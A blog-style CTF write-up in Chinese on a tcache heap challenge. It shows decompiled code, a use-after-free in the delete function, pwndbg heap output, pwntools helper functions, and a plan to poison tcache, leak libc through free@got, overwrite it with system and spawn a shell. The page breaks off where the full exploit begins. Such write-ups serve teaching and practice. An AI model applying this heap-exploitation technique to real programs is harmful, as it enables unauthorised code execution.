+<h2 id="mian函数"><a href="#mian函数" class="headerlink" title="mian函数"></a>mian函数</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [rsp+4h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v5; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v5 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  <span class="hljs-built_in">setvbuf</span>(stdin, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">setvbuf</span>(stdout, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">alarm</span>(<span class="hljs-number">0x3Cu</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome!&quot;</span>);<br>  <span class="hljs-keyword">do</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(menu);<br>    __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v4);<br>    <span class="hljs-keyword">switch</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)off_<span class="hljs-number">400E38</span> )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1u</span>:<br>        <span class="hljs-built_in">add</span>();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2u</span>:<br>        <span class="hljs-built_in">delete</span>();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3u</span>:<br>        <span class="hljs-built_in">edit</span>();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4u</span>:<br>        <span class="hljs-built_in">show</span>();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">5u</span>:<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid option!&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">while</span> ( v4 != <span class="hljs-number">5</span> );<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Bye!&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>可以看到这是一道常见的菜单题目，一共有四个功能，分别是添加，删除，修改，打印，然后跟进四个函数</p>
+<h2 id="add"><a href="#add" class="headerlink" title="add()"></a>add()</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title">add</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+Ch] [rbp-14h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+14h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  v3 = <span class="hljs-number">-1</span>;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">0xF</span>; ++i )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( !ptr[i] )<br>    &#123;<br>      v3 = i;<br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">-1</span> )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Error: Don&#x27;t have enough space!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;What size do you want?&quot;</span>);<br>    __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v1);<br>    ptr[v3] = <span class="hljs-built_in">malloc</span>(v1);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Success! The index is %d .\n&quot;</span>, v3);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28u</span>) ^ v4;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>从add函数中可以看出，我们可以自己控制chunk的大小，与此同时还限定了最多分配１６个chunk</p>
+<h2 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title">delete</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+4h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Which one do you want to delete?&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v1);<br>  <span class="hljs-keyword">if</span> ( (v1 &amp; <span class="hljs-number">0x80000000</span>) == <span class="hljs-number">0</span> &amp;&amp; v1 &lt;= <span class="hljs-number">0xF</span> &amp;&amp; ptr[v1] )<br>  &#123;<br>    <span class="hljs-built_in">free</span>((<span class="hljs-type">void</span> *)ptr[v1]);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Success!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Error: Invalid index!\n&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28u</span>) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>这里可以看到漏洞点，free指针后没有清零</p>
+<h2 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title">edit</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+0h] [rbp-10h]</span><br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+4h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v3 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Which one do you want to modify?&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v1);<br>  <span class="hljs-keyword">if</span> ( (v1 &amp; <span class="hljs-number">0x80000000</span>) == <span class="hljs-number">0</span> &amp;&amp; v1 &lt;= <span class="hljs-number">0xF</span> &amp;&amp; ptr[v1] )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;What size is the point?&quot;</span>);<br>    __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v2);<br>    <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, (<span class="hljs-type">void</span> *)ptr[v1], v2);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Success!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Error: Invalid index!\n&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28u</span>) ^ v3;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>edit函数可以方便我们进行漏洞利用从而进行任意地址malloc</p>
+<h2 id="show"><a href="#show" class="headerlink" title="show"></a>show</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title">show</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+4h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Which one do you want to see?&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v1);<br>  <span class="hljs-keyword">if</span> ( (v1 &amp; <span class="hljs-number">0x80000000</span>) == <span class="hljs-number">0</span> &amp;&amp; v1 &lt;= <span class="hljs-number">0xF</span> &amp;&amp; ptr[v1] )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>((<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)ptr[v1]);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Success!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Error: Invalid index!\n&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28u</span>) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>show函数方便我们进行地址泄露</p>
+<h2 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h2><p>下面的内容就很明了了,但首先我们先抛开如何解这道题，我们先来看看tcache的一些小机制</p>
+<h3 id="tcache机制"><a href="#tcache机制" class="headerlink" title="tcache机制"></a>tcache机制</h3><p>先用gdb加载程序，然后在main函数处下断点</p>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs crystal">nightrain<span class="hljs-variable">@root</span>-pwn-<span class="hljs-symbol">me:</span>~<span class="hljs-regexp">/pwn/tcache</span><span class="hljs-regexp">/tcache$ gdb ./tcache</span><br>pwndbg&gt; b main<br>Breakpoint <span class="hljs-number">1</span> at <span class="hljs-number">0x400b2b</span><br>pwndbg&gt; <br></code></pre></td></tr></table></figure>
+
+<p>好了，然后让我们把程序跑起来，我们先分配两个大小为３２的堆块然后按照０，１的顺序ｆｒｅｅ掉他们<br>也就是add两次，free两次</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">pwndbg&gt; heap<br><span class="hljs-number">0x603000</span> PREV_INUSE &#123;<br>  mchunk_prev_size = <span class="hljs-number">0</span>, <br>  mchunk_size = <span class="hljs-number">593</span>, <br>  fd = <span class="hljs-number">0x0</span>, <br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>, <br>  fd_nextsize = <span class="hljs-number">0x0</span>, <br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x603250</span> FASTBIN &#123;<br>  mchunk_prev_size = <span class="hljs-number">0</span>, <br>  mchunk_size = <span class="hljs-number">49</span>, <br>  fd = <span class="hljs-number">0x0</span>, <br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>, <br>  fd_nextsize = <span class="hljs-number">0x0</span>, <br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x603280</span> FASTBIN &#123;<br>  mchunk_prev_size = <span class="hljs-number">0</span>, <br>  mchunk_size = <span class="hljs-number">49</span>, <br>  fd = <span class="hljs-number">0x0</span>, <br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>, <br>  fd_nextsize = <span class="hljs-number">0x0</span>, <br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x6032b0</span> PREV_INUSE &#123;<br>  mchunk_prev_size = <span class="hljs-number">0</span>, <br>  mchunk_size = <span class="hljs-number">134481</span>, <br>  fd = <span class="hljs-number">0x0</span>, <br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>, <br>  fd_nextsize = <span class="hljs-number">0x0</span>, <br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>此时堆块如上，可以看到我们get了两个大小为49的chunk，为什么是49呢，因为是64位，要和１６对齐，而因为我们申请的大小为３２，此时size+8为40，向１６位对齐为４８，再加上１位标志位，就成了４９,地址内容如下：</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs dns">pwndbg&gt; x/<span class="hljs-number">32 0x603250</span><br><span class="hljs-number">0x603250</span>:	<span class="hljs-number">0x00000000</span>	<span class="hljs-number">0x00000000</span>	<span class="hljs-number">0x00000031</span>	<span class="hljs-number">0x00000000</span><br><span class="hljs-number">0x603260</span>:	<span class="hljs-number">0x00000000</span>	<span class="hljs-number">0x00000000</span>	<span class="hljs-number">0x00000000</span>	<span class="hljs-number">0x00000000</span><br><span class="hljs-number">0x603270</span>:	<span class="hljs-number">0x00000000</span>	<span class="hljs-number">0x00000000</span>	<span class="hljs-number">0x00000000</span>	<span class="hljs-number">0x00000000</span><br><span class="hljs-number">0x603280</span>:	<span class="hljs-number">0x00000000</span>	<span class="hljs-number">0x00000000</span>	<span class="hljs-number">0x00000031</span>	<span class="hljs-number">0x00000000</span><br><span class="hljs-number">0x603290</span>:	<span class="hljs-number">0x00603260</span>	<span class="hljs-number">0x00000000</span>	<span class="hljs-number">0x00000000</span>	<span class="hljs-number">0x00000000</span><br><span class="hljs-number">0x6032a0</span>:	<span class="hljs-number">0x00000000</span>	<span class="hljs-number">0x00000000</span>	<span class="hljs-number">0x00000000</span>	<span class="hljs-number">0x00000000</span><br><span class="hljs-number">0x6032b0</span>:	<span class="hljs-number">0x00000000</span>	<span class="hljs-number">0x00000000</span>	<span class="hljs-number">0x00020d51</span>	<span class="hljs-number">0x00000000</span><br><span class="hljs-number">0x6032c0</span>:	<span class="hljs-number">0x00000000</span>	<span class="hljs-number">0x00000000</span>	<span class="hljs-number">0x00000000</span>	<span class="hljs-number">0x00000000</span><br></code></pre></td></tr></table></figure>
+
+
+<p>然后我们依次free掉这两个chunk</p>
+<figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">pwndbg&gt; bins</span><br><span class="hljs-attribute">tcachebins</span><br><span class="hljs-attribute">0x30 [  2]</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x603290 —▸ 0x603260 ◂— 0x0</span><br><span class="hljs-attribute">fastbins</span><br><span class="hljs-attribute">0x20</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x30</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x40</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x50</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x60</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x70</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x80</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">unsortedbin</span><br><span class="hljs-attribute">all</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br>smallbins<br>empty<br>largebins<br>empty<br></code></pre></td></tr></table></figure>
+
+<p>我们就得到了两个tcache chunk,其中不难看出0x603260为第０个chunk,然后我们再申请一次大小为３２的chunk</p>
+<figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">pwndbg&gt; bins</span><br><span class="hljs-attribute">tcachebins</span><br><span class="hljs-attribute">0x30 [  1]</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x603260 ◂— 0x0</span><br><span class="hljs-attribute">fastbins</span><br><span class="hljs-attribute">0x20</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x30</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x40</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x50</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x60</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x70</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x80</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">unsortedbin</span><br><span class="hljs-attribute">all</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br>smallbins<br>empty<br>largebins<br>empty<br></code></pre></td></tr></table></figure>
+
+<p>这里可以看到我们将第1个tcache先拿出去了，这里就是tcache的一个小机制了，tcache是先进后出</p>
+<h3 id="tcache的一些小利用例子"><a href="#tcache的一些小利用例子" class="headerlink" title="tcache的一些小利用例子"></a>tcache的一些小利用例子</h3><p>为了避免造轮子，大家可以直接看<a target="_blank" rel="noopener" href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/">ctf-wiki</a></p>
+<h3 id="本题解法"><a href="#本题解法" class="headerlink" title="本题解法"></a>本题解法</h3><p>上面列举了一小点tcache的机制，下面开始对本题进行求解<br>本题我采用修改free@got为system函数来进行求解，当然，泄露libc基址的办法有很多，我们可以申请unsorted bin来泄露，而因为本题使用了tcache机制，因此我们采用double free的方式进行泄露<br>这里我们先写了菜单：</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs scss">def <span class="hljs-built_in">add</span>(size):<br>    p.<span class="hljs-built_in">sendlineafter</span>(<span class="hljs-string">&#x27;Your choice?&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.<span class="hljs-built_in">sendlineafter</span>(<span class="hljs-string">&#x27;What size do you want?&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br>def <span class="hljs-built_in">edit</span>(num,size,buf):<br>    p.<span class="hljs-built_in">sendlineafter</span>(<span class="hljs-string">&#x27;Your choice?&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    log.<span class="hljs-built_in">success</span>(<span class="hljs-string">&#x27;[*]choice3&#x27;</span>)<br>    p.<span class="hljs-built_in">sendlineafter</span>(<span class="hljs-string">&#x27;Which one do you want to modify?&#x27;</span>,<span class="hljs-built_in">str</span>(num))<br>    log.<span class="hljs-built_in">success</span>(<span class="hljs-string">&#x27;[*]str&#x27;</span>)<br>    p.<span class="hljs-built_in">sendlineafter</span>(<span class="hljs-string">&#x27;What size is the point?&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    log.<span class="hljs-built_in">success</span>(<span class="hljs-string">&#x27;[*]256&#x27;</span>)<br>    p.<span class="hljs-built_in">send</span>(buf)<br><br>def <span class="hljs-built_in">show</span>(num):<br>    p.<span class="hljs-built_in">sendlineafter</span>(<span class="hljs-string">&#x27;Your choice?&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.<span class="hljs-built_in">sendlineafter</span>(<span class="hljs-string">&#x27;Which one do you want to see?&#x27;</span>,<span class="hljs-built_in">str</span>(num))<br><br>def <span class="hljs-built_in">dele</span>(num):<br>    p.<span class="hljs-built_in">sendlineafter</span>(<span class="hljs-string">&#x27;Your choice?&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.<span class="hljs-built_in">sendlineafter</span>(<span class="hljs-string">&#x27;Which one do you want to delete?&#x27;</span>,<span class="hljs-built_in">str</span>(num))<br></code></pre></td></tr></table></figure>
+
+<p>然后我们利用double free来进行libc的泄露<br>步骤如下：add(24) -&gt; dele(0) -&gt; dele(0) -&gt; add(24) -&gt; add(24) -&gt; show(2)</p>
+<figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">pwndbg&gt; bins</span><br><span class="hljs-attribute">tcachebins</span><br><span class="hljs-attribute">0x20 [  1]</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x602018 (_GLOBAL_OFFSET_TABLE_+24) —▸ 0x7fab79c65950 (free) ◂— ...</span><br><span class="hljs-attribute">fastbins</span><br><span class="hljs-attribute">0x20</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x30</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x40</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x50</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x60</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x70</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x80</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">unsortedbin</span><br><span class="hljs-attribute">all</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br>smallbins<br>empty<br>largebins<br>empty<br></code></pre></td></tr></table></figure>
+
+<p>在dele后我停了一下，此时tcache的next指针已经指向了free函数，我们只需要再申请两次chunk然后直接进行打印就可以得到free的地址，然后减去free@got的地址就可以直接得到libc的基址<br>此时我们可以提前把id为１的chunk块内容改成&#x2F;bin&#x2F;sh，最后只要把free函数改成system函数，然后dele(1)就可以get shell了，exp如下：</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span 